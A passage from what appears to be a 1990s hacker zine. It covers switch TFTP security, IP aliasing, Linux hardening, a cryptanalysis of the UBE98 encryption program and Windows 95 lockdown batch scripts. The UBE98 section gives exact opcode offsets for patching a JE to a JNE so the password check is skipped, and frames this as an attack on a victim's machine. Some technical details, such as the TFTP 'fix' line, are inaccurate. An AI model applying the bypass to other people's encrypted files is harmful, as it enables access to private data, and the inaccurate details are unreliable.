+you from deleting any critical data. Logs maybe? =] ..More will be written 
+on ES-3810 security  features/insecurities when time permits.   
+ 
+To fix this disable TFTP by issuing the following command 
+ 
+lou% tftp dgram udp wait user /etc/tftpd tftpd -n  
+ 
+Sources Cited: 
+ 
+Fore Systems 
+ 
+ 
+ 
+-optiklenz <optik@legions.org> 
+ 
+                       -D A T A   D E S I R E S  T O  B E  F R E E- 
+ 
+-----BEGIN PGP PUBLIC KEY BLOCK----- 
+mQGiBDR6E3wRBADHm2aiODOCowgDqXdcFvooCTrQe6tDPqznXChCO1p0t12hhQZe 
+0C+/xBorkJXlqOaDadmUQVZP3Kij97SOTWU1AS1SPSTzF6VAylHalGz9iUHjxa7g 
+SSAVrLUMngWG7hxnz7lBHFIQ8iQPjWvK5qhEQ9vcBF9ped9StPRsZlljIwCg/02Z 
+XXrVaJUtWAxUaAARUdPt0FsEAKyhGuQA1HgGWM/GQxpvBvmDqHkNGxM9YyrF1Dg1 
+PWAoNuG8GdJazj18c2AODp68NwPH0dUYTxKc4ejR//OcOfl1HRfE0thJEDpqkSyQ 
+2iobKGkYdmug666pe0Xr3wkgBE+rnzC3RLlUdnRAu25MuEqlc6yRWAT0YH/Pl9IB 
+eDRGA/4uAuFiEiyfd3Djhi7Wwh8/qiG7SChW0arEXq3RqHQqd3EaVR1FgNzCtvxg 
+kK2mY07XeSX2fjlWo4ynrBdl5QXbOn9X+GzDcw1z9FBVQHaY0EJMoE0fb53bTyCG 
+0bdCMTid1DUKhJeekW6cPZvRQlu5IjH/+FVT9S38UsAMMwwrCrQlU3RldmUgU3Rh 
+a3RvbiA8b3B0aWtsZW56QGxlZ2lvbnMub3JnPokASwQQEQIACwUCNHoTfAQLAwEC 
+AAoJEGgSVovfJxzQFfcAn0WybtLnFw9jf9agk7xUaikjEjLkAKCYfA1rx/SXP5Je 
+v5R0+ZVMqIGiibkCDQQ0ehN8EAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlL 
+OCDaAadWoxTpj0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N 
+286Z4VeSWc39uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/ 
+RgBYK+X0iP1YTknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2O 
+u1WMuF040zT9fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqV 
+DNmWn6vQClCbAkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAgf+OCRz2nG+ 
+SSCrgZY2nIGz68SO+2h3weFMzdBSWQDjZ5Fa7GjRBPeTRQvectPvSqcwjeZTq8DE 
+1AVI/oFw1mChgfV7CgQuC+P0OK+jr6tIwyhM6gdo5NEdD7/uLWJfFi2l/AP4skVv 
+ydmg1KGlxjvtjOFKhOGoV2vSTPRGn1l1lCzBZPRur0xTtNwk5b54o8g/NlMEsO/p 
+/P6CRP4J1WlDkH66jST+ygAYNN0AtRy0eEPUxu7+dYC4OgT0xCcglCqKf7hnMGrf 
+s/I2MHBbhSmdtcW5pLYcEb8iwXEitGN+plAy+OZrygJ4ytFAdnL2r9NmegUPTYz0 
+3t4M3hiITUmiP4kAPwMFGDR6E3xoElaL3ycc0BECKBQAoKqOQNZ82RmU4rsZRM9l 
+a6QdQeSVAJ469y3cLO1eU5oMYpLdvSGevh0mSg== 
+=cpan 
+-----END PGP PUBLIC KEY BLOCK----- 
+ 
+EOF@
+
+---------------------------------------------------------------------------
+[IP Aliasing]                                                        [m0f0]
+---------------------------------------------------------------------------
+
+In a LAN environment, clients and servers are connected to the network by 
+one or more network controller cards. Each controller has a factory-set 
+(hard-coded) primary physical address called the MAC address. The MAC 
+address is also known as the primary unicast address. For an Ethernet
+controller, the MAC address is a string of hex bytes that looks, for  
+example, like this:
+
+	08:0a:10:bc:7f:5d
+
+In addition to its own name, the controller can recognize up to 16 alias 
+names placed in the its driver's multicast address list. The controller
+accepts any packet sent to its primary unicast address and any packets 
+sent to an address in its multicast list.
+
+The IP address is a unique name given to a controller to identify it on 
+the network. The IP address is a broken numeric string that looks similar 
+to:
+
+	129.226.55.33
+
+Traditional internet protocol (IP) allows each controller on a network to 
+have one IP address, which is mapped to the MAC address to establish its 
+network identity. IP aliasing allows each controller to have a secondary 
+IP address (an alias) supporting up to 16 unique virtual addresses, so 
+that a network administrator can greatly expand the effective size of the 
+network without installing additional hardware. The virtual addresses are 
+mapped to the multicast list of the physical controller.
+
+The utilities ipalias and macconfig are used to create multiple virtual 
+interfaces on a single physical network interface. Although the primary 
+interface is brought on line with ifconfig, the IP layer treats the 
+primary and secondary addresses as equals with identical responses ping, 
+ftp, telnet, rcp, rlogin, and so forth.
+
+Aliasing the MAC Address
+
+The macconfig utility is used to add a multicast address to the list of 
+multicast addresses on system X. This task involves the conversion of a 
+unicast address to a new form, the multicast address. An understanding of 
+48-bit Universal LAN MAC address structure makes this task easier.
+
+48-bit Universal LAN MAC Address
+
+The concept of universal addressing is based on the requirement that all 
+members of a network have a unique identifier. Otherwise they cannot 
+coexist. The advantage of a universal address is that a node with such an 
+address can be attached to any LAN in the world with an assurance that its 
+address is unique.
+
+The 48-bit Universal Address consists of two parts:
+
+1. The first 24 bits correspond to the Organizationally Unique Identifier 
+(OUI) as assigned by the IEEE, except that the assignee may set a control 
+bit for group addresses (multicast addresses) or for individual addresses 
+(unicast addresses).2. The second part, comprising the remaining 24 bits, 
+is administered locally by the assignee. In the following 48 bit LAN MAC 
+address, the Organizationally Unique Identifier is contained in octets 0, 
+1, 2 and the remaining octets 3, 4 and 5 are assigned locally.
+
+Octet	0		1		1		3		4		5
+Binary	0011	0101	0111	1011	0001	0010	0000	0000	0000	0000	0000	0001
+Hex	C	A	E	D	8	4	0	0	0	0	0	8
+
+The least significant bit or first bit octet 0 is the I/G address bit used 
+to identify the destination address, either as an individual/unicast 
+address (0) or as a group/multicast address (1) that identifies one, 
+several, or all stations connected to the LAN. The all-station broadcast 
+address is a special predefined group address off all 1's.
+
+The second bit of octet 0 is the Universally or Locally Administered (U/L) 
+bit. This bit indicates whether the address has been assigned by a local or 
+universal administrator. Universally administered addresses have this bit 
+set to 0 and they are globally/universally unique. This is the normal 
+case. If this bit is set to 1, the entire address (all 48 bits) has been 
+locally administered and may not be globally unique. Thus, for example, 
+bytes 0,1 and 2 would be unique for SynnerGy Networks, and 
+SynnerGy Networks can then assign the last 24 bits for each network 
+interface controller it manufactures, thereby allowing approximately 16 
+million individual addresses and 16 million unique group addresses that 
+no other organization can have (universally unique).
+
+Converting a Unicast Address to a Multicast Address
+
+For a given 48-bit Universal LAN MAC address, the first 24 bits 
+correspond to OUI. The least significant bit (the first bit or I/G bit) 
+of the OUI is the only bit that can be changed to make this address a 
+multicast address. We cannot change any other bit without either 
+compromising uniqueness of the address or violating some IEEE addressing 
+standards.
+
+The U/L bit for a universally unique address is always 0. This leaves the 
+following four possibilities in the least significant nibble (4 bits) of 
+a valid universally unique unicast/individual address:
+
+0x0(0000)
+0x4(0100)
+0x8(1000)
+0xC(1100)
+
+where 0x indicates a hexadecimal digit.
+
+Given the fact that we can only change one bit (the I/G bit) to convert 
+the unicast address to a multicast address, we have the following 
+transformations:
+
+0x0(0000) ? 0x1(0001)
+0x4(0100) ? 0x5(0101)
+0x8(1000) ? 0x9(1001)
+0xC(1100) ? 0xD(1101)
+
+Thus, for a given unicast address, 08:00:0b:06:1d:50, for example, 
+the multicast form is 
+09:00:0b:06:1d:50.
+
+
+Address Resolution Protocol
+
+The IP addresses must be mapped to MAC addresses before a client can 
+successfully send a packet to a server or peer on the network. In TCP/IP, 
+the Address Resolution Protocol (ARP) is used to seek and map the address 
+information. The client sends an ARP broadcast query that says, in effect,
+"Here is a destination IP address. Send me your MAC address." This query 
+is seen by all the controllers on the network, and the owner of the IP 
+address replies with its MAC address. The client stores the IP/MAC address
+map entry in a small  table called the ARP cache. This information can be
+published by ARP.
+
+Aliasing the IP address - An Example
+
+Initially, the network controller is brought online and given a primary IP 
+address using ifconfig. Now we use ipalias to create up to 16 additional 
+network identities on the secondary IP address and will honor all 
+communication sent to its IP Aliases.
+
+Steps to bring a virtual network interface up on a system are:
+
+1. Add the alias IP address to the interface using the following command 
+   sequence:
+
+$ ipalias -a 129.226.55.33 et5961
+
+where (as an example) 129.226.55.33 is the alias IP address and et5961 is 
+the controller name.
+
+2. Add the multicast address to the interface
+
+$ macconfig -m 129.226.55.33 9:6:a:b:3:e et5961
+
+where 9:6:a:b:3:e is the example MAC address and et5961 is the controller 
+name.
+
+3. Invoke ARP to publish the mapping.
+
+$ arp -s 129.226.55.33 9:6:a:b:3:e pub
+
+4. Check the mapping published by ARP, which should appear as shown on 
+the seconds line of this example.
+
+$ arp -a
+(129.226.55.33) at 9:6:a:b:3:e permanent published
+
+>From this point onward any system on the network can access this aliased 
+IP address (129.226.55.33) using ping, telnet, ftp, rlogin, rcp, rsh, and 
+so forth.
+
+m0f0
+
+---------------------------------------------------------------------------
+[Yet Another Newbies Guide to Linux Security]               [Digital Ebola]
+---------------------------------------------------------------------------
+
+Another one bites the dust today. Young grasshopper gets burned by a 
+mad cracker wishing to gain yet another root prompt. In this article, 
+I will go into the "minimal/BOFH" approach to Linux system security. 
+I will not go into great detail over services or packages. This guide 
+is to be taken as guidelines and not exact instructions. If you are 
+not familiar with BOFH tactics, go read some BOFH stories, they are 
+funny as hell.
+
+Good Linux security starts from the install. Period. You should 
+choose your distribution well, or be prepared to either be owned 
+quickly, or learn your system quickly. Depending on your distro, you 
+will have a choice on packages, and modules. Read on these. The very 
+first thing you should do, is acquaint yourself with each and every 
+package, and its particular bugs, or holes. When you build your box, 
+you should know your exact purpose for it and build it accordingly. 
+If you are building it strictly for firewall purposes, then there is 
+no reason to run XFree86. If you already have a print server on your 
+network, then theres no reason why you should install printer 
+services. This approach not only works well, but lets the system grow 
+as you do, and starting off small, means that when you do add extras,
+ they will be installed properly, without risk, because you know 
+exactly what you are installing. 
+
+Minimal packages mean less maintainence. Although its nice to have
+everything on one system, its not good from a security aspect. As
+well as being minimalistic on the packages, be the same way on 
+services. Do not elect to run services you are never going to use. 
+Most dialup connections have no business running BIND, or POP3. Keep 
+the services down to a minimal, as the less services you have, the 
+less doors a intruder has to your system. If you are running a network 
+on ISDN or multiplexed line, it would be highly advisable to divide 
+those kinds of services to different machines. POP3 and BIND both are 
+notorious for security holes, and just because you don't see exploit 
+code on rootshell, does not mean exploit code does not exist. 
+
+When it comes to dealing with the packages you have, it can be a 
+tricky thing. You have set down, and set a purpose for your machine,
+researched the packages, and killed all unnessacary services. Whats 
+left, are the things that are needed. How do you protect whats there? 
+Permissions. You MUST check every SUID root binary. Some things in the 
+distro have no business being SUID root, although the person who coded 
+it seemed to think it was a good idea. Works for him, but could be 
+fatal for you. To check to see what is SUID on the system do this:
+
+linux$ find / -perm -4000 -print
+
+This string will list ALL the SUID binaries on the system. You need to
+run each one as a USER and see what happens. A lot of them will be 
+protected, some however, will not. You have to analyse the use of the 
+binary, and decide whether or not the binary needs to be SUID root. 
+Or decide whether or not your user needs to run it. This is the BOFH 
+approach in a way. Why would a remote user need PING? They really 
+dont, and PING itself is SUID root by default under most Linux 
+distrobutions. Does the user need compiling functions? If, most of 
+your users are not coding, then you should create a group for coding, 
+and put only trusted people in it. This is very much BOFH. This also 
+eliminates "script kiddies" or makes their life tougher, and protects 
+certain linked libs. Tailor the box, for the general kind of users on 
+the system.
+
+Countermeasures improve security. One such package is Abacus Sentry. 
+This binary listens on TCP/UDP ports, and tries to detect port scans. 
+Upon port scans, it will put the offending host on deny and attempt 
+to cut its route. This is very evil, very effective and will make 
+/etc/hosts.deny grow to huge proportions. There is a flaw with it. 
+A enterprising person, could fake the scan to make it look like it 
+came from your router, thus denying yourself, and cutting your route. 
+ Enough said. Sometimes there is a price for good security, again, as 
+I have said before, you have to build for your needs. Another 
+countermeasure tool, is Tripwire. Tripwire will watch certain files 
+for modifications, such as /root/.bash_profile or whatever else you 
+may configure it for. Upon modification, it will mail root. 
+
+Watching the network your system on is vital if you are in a LAN 
+enviroment. Bins such as Sniffit, Netwatch and even good ole Netstat 
+are important if you are to maintain security, both on the inside and 
+out. Of course, in this article, we are only hitting the basics of 
+Linux security, but think about this. All the security in the world 
+is no good, if the people you are connected to are not secure 
+themselves. Do not be afraid to not only question yourself, 
+your users, but your provider as well. You must watch your subnet, 
+manage your users, and keep everything in working order. 
+Your provider should do the same. Although, its debatable whether 
+they can legally snoop your sessions, you, the newbie with the linux
+ box, can. Do not be afraid to cat .bash_history, or grep logs. Or 
+even ttysnoop for that matter. If you have a questionable user, you 
+need to know what is going on. As a rule, users never give straight 
+answers, it would be the same as if you were questioned by your 
+provider. 
+
+For the newbie, learning can be frustrating and time consuming. 
+Whether you are learning for yourself, or your business, nobody likes 
+to be owned. In this day and age, information can not only make you 
+prosper, but what you don't know can kill you. Or in this case, your 
+systems. Do not be afraid to experiment with new tactics or new ideas.
+ Do not choke your users, you CAN be too secure. It all comes down to 
+your needs and the needs of your users. Use common sense, and read 
+everything. And then, you too, may be wise in the ways of Linux 
+security. :)
+
+Digital Ebola aka DigiEbola
+http://wintermute.unixgeeks.com
+digi@wintermute.unixgeeks.com
+
+---------------------------------------------------------------------------
+[UBE98 -- Unbreakable Encryption]                             [Joe Peschel] 
+--------------------------------------------------------------------------- 
+
+UBE98 is an encryption program by CIPHERTech at: 
+CIPHERTech 
+ 
+The site is in England so the chap who designed the program isn't 
+encumbered by the United States' EAR (Export Administration Regulations). 
+ 
+                             Introduction 
+ 
+The UBE98 author describes the program: 
+ 
+255 Byte RC4 Algorithm - The strongest encryption algorithm in the world! 
+Automatic Encryption - Self extracting Encrypted file creation - QuickView
+encrypted pictures - Win98 style caption bars and menus - Seamless windows   
+95/98/NT integration - Transparent use - UBE 98 has to be the choice for
+you.  Download it now for free!   
+
+There was also a review in the British press entitled "The 30 billion 
+year encryption problem" at:  BBC Article 
+ 
+You might notice that the BBC refers to a 2,048-bit key while the author 
+says the key is 2,040 bits. The time needed to brute-force such a key, of 
+course, is wrong, too. There are other errors in the report, too, that 
+I'll let you enjoy (or cringe at) at your leisure. UBE98's problems are 
+bigger than just a reporting error over the real size of the key, and the
+time it would take to brute-force  the key. The British government likely
+isn't worried about having to crack UBE98 if it needs to. In  this paper, 
+I'll describe three ways to break UBE98.   
+                   
+The Known-Plaintext Attack 
+ 
+I was first reminded of UBE98 in sci.crypt when I saw a mention of the 
+program's file wiping capability. Later, I noticed Mike Stay commenting in 
+coderpunks on UBE98's encryption capability. Some experts responded to the 
+initial mention of UBE98's large RC4 key as quite possible, and asked why 
+they thought the original poster considered the program snake-oil. I am 
+sure had those experts looked at the program they would have determined
+quickly the  worthlessness of UBE98 as an encryption program. 
+ 
+Stay soon described his attack in coderpunks: 
+ 
+I downloaded the thing. It asks for a bunch of information (like e-mail 
+address, name, address, 25 random keystrokes). I wrote Peter about how he 
+created the key and he says it's MD5 and SHA plus some "random bytes from 
+various places in the computer." The key is stored somewhere and
+protected with a password. It's always the same key. I encrypted a file
+of zeros and another file, XORed the two and got the original. A known
+plaintext attack will break every file you ever encrypt with this (because 
+it only generates one key, ever.) I might add that you can also save the 
+key (255 bytes) to a floppy disk, which in itself may pose a security risk.
+Also, even though the created key is always the same on each installation, 
+the key is different on different systems. I mentioned Stay's analysis in
+sci.crypt hoping to steer folks away  from a poor encryption product. In
+response a fellow called Melih suggested that a cracker could  find other 
+ways to attack UBE98. So I set about finding a couple more attacks on 
+this dubious symmetric cipher. 
+
+Cracking a Dubious Symmetric Cipher By Disassembling the Program 
+ 
+UBE98 does typical symmetric encryption and lets you create 
+self-extracting encrypted executables. In order to access the content of 
+either encryption you need to enter a password. Since, as Stay pointed 
+out, the key is always the same, I theorized the program's check of the 
+correct password might be subverted in a way less conventional than 
+typical cryptanalytic attacks. 
+ 
+Let's consider a typical encryption first. We'll assume that we have 
+access to the victim's machine. We are going to try Stay's attack on 
+UBE98, but we'll bring with us a few of floppy disks for copying *.ube 
+files. One of our disks will be home to a file (500k or so) of 00s of 
+known-plaintext and a hex editor such as HIEW. First, we'll copy all of 
+the encrypted .ube files to floppy disk. Next, we'll need to encrypt our 
+known-plaintext (the 00 file) with the victim's key. We'll assume that he 
+hasn't left the password in memory, even though UBE98 has that capability.  
+ 
+So we'll need to bypass the password. Naturally, we have figured out a 
+way to bypass it. 
+ 
+A file called hook32.exe is the program's executable. Upon previously 
+disassembling the .exe we found an interesting JE instruction in the code 
+prior to the error message string: "You have entered an incorrect password." 
+ 
+ :0044A026 
+           7458  
+                je  
+                   0044A080  
+ 
+In our hex editor, we change the JE instruction to JNE by changing 74 to 
+75 at offset 00049426h and run UBE98 with our slightly modified 
+executable. The result: UBE98 accepts an incorrect 
+password or no password at all and decrypts any encrypted file.  
+ 
+Armed with that knowledge, we attack the victim's UBE98 installation and 
+either hex edit the UBE98 executable or run a patch to change the 
+instruction. Now we can either XOR at our leisure on our own system, or 
+decrypt while at the victim's system.  
+ 
+Cracking Self-Extracting Encrypted Files 
+ 
+Self-extracting encrypted files are intended to provide a way to send 
+encrypted email. It's not a bad idea, but normally you still need to find 
+a way to securely transmit the key. Finding a secure way to transmit the 
+key, unfortunately, in UBE98's case makes little difference since a 
+self-extracting encrypted file can be cracked in the same way as 
+hook32.exe.  
+ 
+We can assume either we have access to the sender's machine or that we 
+have the capability of intercepting the sender's and recipient's email. 
+In either case, we are in possession of encryptedfile.exe. We guess that 
+the password is likely checked as it is in hook32.exe and look 
+for a JE instruction in the disassembly.  
+ 
+In the disassembly, we find the string "You have not entered the password 
+with which this file was encrypted. Please try again." 
+ 
+We find this instruction prior to the error message string: 
+ 
+ :0042D13E 
+           0F84A0000000  
+                         je  
+                            0042D1E4  
+ 
+In our hex editor we change JE to JNE (84 to 85). When we execute the 
+self-extracting encrypted file we find that, like hook32.exe, an 
+incorrect password or no password at all decrypts the file. 
+ 
+UBE98 is even worse than I thought.
+
+---------------------------------------------------------------------------
+[Windows 95 Protection]                                            [NtWak0]
+---------------------------------------------------------------------------
+
+GREATS TO U ALL MY BROTHERS/SISTERS FROM "NtWaK0"
+
+To me a hacker isn't just someone doing "illegal" things like cracking 
+other people's passwords or breaking into some computer to steal
+information's. I think a hacker is everybody interested in experimenting 
+with computers or the telephone network.
+
+Quote:---------------------------------------------------------------------
+"Any Grandma can call herself a hacker when she's able to program her VCR"
+---------------------------------------------------------------------------
+
+This document is for educational use only and it is very helpful for 
+schoolteacher n student....I am not going to show you how to hack a 
+windows Box but how to protect it and when you know How to protect your 
+self and other that mean you can have fun with that box too? --:)
+
+When you start using a school computer and whatever the purpose of the 
+usage the PC configuration is constantly modified by the student or 
+teacher. That will lead to a lot of security holes and system 
+misconfiguration
+
+It is necessary " to lock " the computers, so that the pupils cannot 
+change the configurations nor to destroy files but to only work with
+applications planned for them.
+
+Only the supervisor can modify this configuration or install new 
+software. The supervisor is not inevitably a single individual, but can 
+be represented by two or three Qualified people. If it is the case, 
+these people will have systematically to act in concert for the least
+modification.  The supervisor must always be with the listening of the 
+other teachers and take account of their remarks and proposals.  
+  
+>From now on, with the Windows 95 launching, this dialogue box appears :
+ 
+The supervisor can type his name: sup and its password. This word must 
+known by a minimum of people and never be typed in front of a pupil who 
+could recognize the keys typed on the keyboard (although it appears in 
+the form *******). In the same way, this word should not form part of the
+vocabulary of our pupils, because they could extremely well find it while
+grouping. Its length will be of at least 5 letters. 
+
+Fault of knowing the password, the children click on cancel or press on 
+the key [ Esc ]. If they would type an unspecified name and a password of
+their invention (one can trust them,  they will not deprive oneself any) 
+the computer will accept them, but they will be found in  any event with 
+the same configuration as the others and as they will not be able to 
+modify this configuration by default.  
+
+How to carry out the protection of a computer ? How Does Windows Use 
+System Policies? 
+
+When the user logs on, Windows checks the user's configuration 
+information for the location of the policy file. Windows then downloads 
+the policies and copies the information in the registry using the 
+following process. 
+
+First if user profiles are enabled Windows checks for a user policy 
+section that matches the user name and applies the user specific policy. 
+If Windows does not find a user policy section, it applies the Default 
+User policies. If support for group policies is installed, Windows 
+downloads group policies, starting with the lowest priority group and 
+ending with the highest priority group. 
+
+Group policies are processed for all groups to which the user belongs.
+Group policies are not applied if there are user policies defined for the 
+user. These settings are copied into the USER.DAT portion of the registry. 
+
+Second Windows applies computer specific policies to the desktop 
+environment. If a policy section for that computer name does not exist
+Windows applies the Default Computer policies. These settings are copied 
+into the SYSTEM.DAT portion of the registry. 
+
+By default Windows automatically attempts to download computer and user 
+policies from the file Config.pol in the Netlogon folder on a Windows NT
+server or the Public folder on a NetWare  server. This default location 
+can be overridden in a policy file setting. If no server is present 
+Windows uses the settings currently on the client computer.
+
+
+The System Policy Editor?
+
+When you run System Policy Editor Windows 95 opens the default policy 
+template, which contains existing policies that you can enable or modify. 
+A template is a listing of the possible policies that an administrator 
+can set. 
+
+The Office Resource Kit Tools and Utilities CD-ROM include the latest 
+version of the System Policy Editor.This is the same version that is 
+included with Windows NT Workstation 4.0 and  you can use it with both
+Windows 95 and Windows NT Workstation 4.0. Using the System Policy  
+Editor, you can set user policies for all users, for a particular network
+group, or for a  single user. User policies are system policies that 
+represent application options relevant to the user currently logged on to
+Windows and they are stored in the HKEY_USERS portion of the user's 
+Windows registry
+
+ 
+Activation of the system of the passwords:
+To launch Windows 95. Click on Start>Parameters>Control panel>Passwords. 
+In: " User profiles ", check the following options: 
+CHECK User can customize their preferences blah blah blah
+CHECK Include desktop Icons and Network blah blah blah
+CHECK Include start menu and program blah blah blah
+Click Ok, and agree to start again the computer
+
+ 
+With the exit of the Windows 95 restarting, you will see a dialogue asking 
+you your name And your password will appear.When the dialogue box 
+requiring name and password appears again, press on the key [Esc].By doing 
+this, we will launches the configuration by default, which will become 
+the configuration for the pupils. 
+
+At this point all what you have to do is to delete the shortcut and the 
+unwanted application from the start menu, and from the desktop. Next step 
+is to use poledit and change all the  options that you want restrict.
+
+---------------------------------------------------------------------------
+Caution!!! Poledit will modify the Base of register per default 
+(C:\Windows\User.dat). It is an operation, which can be dangerous if we 
+don't know what we are doing. It is thus advisable to back up the 
+User.dat file on diskette before starting
+---------------------------------------------------------------------------
+
+
+At the end of the modification, click on Ok, then in the menu File, click 
+on close. Lastly answer Yes when a dialogue box proposes to the 
+modification. Certain options will take effect only after having started
+again the computer. 
+
+Therefore click on: Start>then Stop To start again the computer (remove the
+diskette  temporarily).
+
+Let us say we have a new user SO-AND-SO
+
+1 The file C:\Windows\SO-AND-SO.pwl keep the user password.
+2 The folder profil C:\Windows\Profiles\SO-AND-SO This file contains the 
+  personal registry User.dat  of SO-AND-SO
+3 The default registry setting C:\Windows\User.dat can be found in the 
+  section: Hkey_Local_Machine\Software\Microsoft\Windows\Current_Version\
+  Profile_List \
+
+Thus, if we wants to remove the superfluous profiles, while preserving the 
+profile sup, it is necessary to do :
+
+1 Erase all the C:\Windows\*.pwl files except for Sup.pwl
+2 Empty the C:\Windows\Profiles file and all its under-files except for 
+  the sup, which by the same occasion will be recopied in C:\Windows\Sup
+3 Recopy the reference registry (*)  : User.stu + System.stu In User.dat + 
+  System.dat (The old registry will be saved as User.bak + System.bak).
+
+All these operations can be automated, by carrying out the command in the 
+file Nettoie.bat
+
+The register of C:\Windows\User.stu reference + System.stu will be 
+created by carrying out the command in the file Sauve.bat, which is made
+automatically at the time of the installation
+
+Thereafter, it will be necessary to carry out Sauve.bat only after 
+possible modification of the configuration (by default).
+
+Important: Before starting the modification use the batch file 
+nettoie.bat to clean you your system
+
+
+---------------------------------------------------------------------------
+
+NETTOIE.BAT     
+
+The role of this file is to remove all the profiles automatically, except 
+one: that of the supervisor (sup). It will have to be carried out rather
+often and regularly
+
+In particular, always carry out before modifying the registry.
+Here the source of NETTOIE.BAT (attention!!! this command file must be 
+launched starting from Windows 95, either in a Dos session, or directly
+starting from the Browser. Indeed, if one  launches it in exclusive Dos 
+mode, the long names will not be managed correctly).
+---------------------------------------------------------------------------
+@echo off
+cls
+echo NETTOIE.BAT - NtWaK0 1/6/99
+set os=windows
+if exist c:\%os%\sup.pwl goto suite1
+echo The supervisor profile (sup) was not created yet. You cannot carry out nettoie.bat
+echo at the moment
+goto fin
+:suite1
+echo List of actual profiles (*.pwl) :
+echo.
+dir c:\%os%\*.pwl /b /p
+echo.
+echo If you see several profiles, only SUP.PWL must be preserved
+
+choice /N You want delete the other profiles (Y or N) ? 
+if errorlevel 2 goto fin
+
+echo.
+attrib +r c:\%os%\sup.pwl
+del c:\%os%\*.pwl > nul
+attrib -r c:\%os%\sup.pwl
+
+cls
+echo Erasing the superfluous profiles...
+echo.
+
+if exist c:\%os%\profiles\sup\*.* goto suite2
+echo No file of supervisory profile (sup) is detected!!!
+goto fin
+
+:suite2
+if exist c:\%os%\sup\*.* deltree /y c:\%os%\sup\*.* > nul 
+attrib -s -h -r c:\%os%\profiles\sup\*.*
+xcopy32 c:\%os%\profiles\sup\*.* c:\%os%\sup\ /s /e > nul
+deltree /y c:\%os%\profiles\*.* > nul
+xcopy32 c:\%os%\sup\*.* c:\%os%\profiles\sup\ /s /e > nul
+attrib +r +h +s c:\%os%\profiles\sup\*.*
+
+if exist c:\%os%\user.stu goto suite3
+echo The student registry (reference ) (User.stu)
+echo Was not detected!!!
+goto fin
+
+:suite3
+attrib -s -h -r c:\%os%\user.dat
+attrib -s -h -r c:\%os%\user.stu
+if exist c:\%os%\user.bak del c:\%os%\user.bak
+rename c:\%os%\user.dat user.bak
+copy c:\%os%\user.stu c:\%os%\user.dat > nul
+attrib +r +h +s c:\%os%\user.dat
+attrib +r +h +s c:\%os%\user.stu
+attrib -s -h -r c:\%os%\system.dat
+attrib -s -h -r c:\%os%\system.stu
+if exist c:\%os%\system.bak del c:\%os%\system.bak
+rename c:\%os%\system.dat system.bak
+copy c:\%os%\system.stu c:\%os%\system.dat > nul
+attrib +r +h +s c:\%os%\system.dat
+attrib +r +h +s c:\%os%\system.stu
+
+echo All the different profiles other then SUP were deleted
+echo.
+echo Now, you must start again Windows...
+:fin
+set os=
+echo.
+----------------------------------------------------------------------------
+
+----------------------------------------------------------------------------
+SAUVE.BAT 
+
+This command file must be carried out after any modification of the 
+configuration raises (then the default configuration). Be certain that no 
+different profile than sup exists before launching sauve.bat (if not, the
+Base of register of User.stu reference would keep trace of the undesirable
+profiles).
+
+Do not forget to carry out nettoie.bat before modifying the default 
+configuration, in order to eliminate the different profiles other then sup
+----------------------------------------------------------------------------
+@echo off
+cls
+echo SAUVE.BAT - - NtWaK0 1/6/99
+echo.
+
+set os=windows
+
+if exist c:\%os%\sup.pwl goto suite1
+echo The supervisor profile (sup) was not created yet. You cannot carry out sauve.bat
+echo at the moment
+goto fin
+
+:suite1
+if not exist c:\%os%\user.stu goto nouveau
+if not exist c:\%os%\system.stu goto nouveau
+echo Sauvegarde de USER.stu + SYSTEM.stu
+goto suite2
+
+:nouveau
+echo First use. Creation of USER.stu + SYSTEM.stu
+:suite2
+echo.
+attrib -s -h -r c:\%os%\user.dat
+if exist c:\%os%\user.stu attrib -s -h -r c:\%os%\user.stu
+copy c:\%os%\user.dat c:\%os%\user.stu > nul
+attrib +r +h +s c:\%os%\user.dat
+attrib +r +h +s c:\%os%\user.stu
+attrib -s -h -r c:\%os%\system.dat
+if exist c:\%os%\system.stu attrib -s -h -r c:\%os%\system.stu
+copy c:\%os%\system.dat c:\%os%\system.stu > nul
+attrib +r +h +s c:\%os%\system.dat
+attrib +r +h +s c:\%os%\system.stu
+echo End.
+
+:fin
+set os=
+echo.
+---------------------------------------------------------------------------
+
+The Browser coded
+
+The source program of the Browser coded realized in Qbasic (Explore.bas), 
+then is compiled (Explore.exe) and is recopied in C:\Windows\System. A 
+short cut towards Explore.exe will be  slipped into the Menu To start 
+by default, after all the restrictions were applied by Poledit 
+(not to cancel the option: to carry out programs MSDOS). 
+
+The password file (Explore.psw) is a simple textual file which contains 
+the password in clear text (better is to not use Edit in a DOS session...)
+it is also; located in C:\Windows\System.
+
+Here the source of Explore.exe:
+---------------------------------------------------------------------------
+ ' EXPLORE.EXE - NtWaK0 - 1/6/99
+ '
+ CLS
+ OPEN "I", #1, "c:\windows\system\explore.psw"
+ INPUT #1, code$
+ CLOSE #1
+ lcode = LEN(code$)
+ COLOR 14: PRINT : PRINT "  If you don't know what to do, type *"
+ PRINT
+ c$ = "": t$ = "": cpt = 0
+ DO
+   t$ = INKEY$: IF t$ <> "" THEN c$ = c$ + t$: cpt = cpt + 1
+   IF cpt > 30 THEN
+     COLOR 12: PRINT "  Searching for Code ???"
+     BEEP: BEEP: BEEP
+     FOR i = 1 TO 500000: NEXT i
+     END
+   END IF
+   IF t$ = "*" THEN BEEP: END
+   IF LEN(c$) > lcode THEN c$ = RIGHT$(c$, lcode)
+ LOOP UNTIL c$ = code$
+ COLOR 10: PRINT "  Explorer..."
+ FOR i = 1 TO 100000: NEXT i
+ SHELL "c:\windows\explorer.exe"
+ END
+
+---------------------------------------------------------------------------
+PHOTO.BAT
+
+This command file makes it possible " to photograph " the complete 
+configuration of a computer after we entirely protected it (creation of 
+the supervisory profile, clean-up in the Start Menu restrictions on the
+configuration by default, etc.)
+
+When we carries out A:\photo.bat, the configuration of the computer is 
+entirely recopied on this same diskette in a file A:\Windows 
+(approximately 200 to 600 KB).
+
+Thereafter, we will recopy this configuration on another computer, while 
+launching Windows 95 then by carrying out A:\duplique.bat starting from 
+the Browser. With the restarting, the second computer will be configured
+like the first. We will be able to  then carry out duplique.bat, on all 
+the computers, which we wants to protect
+
+---------------------------------------------------------------------------
+Caution! A:\photo.bat and A:\duplique.bat should not be carried out in 
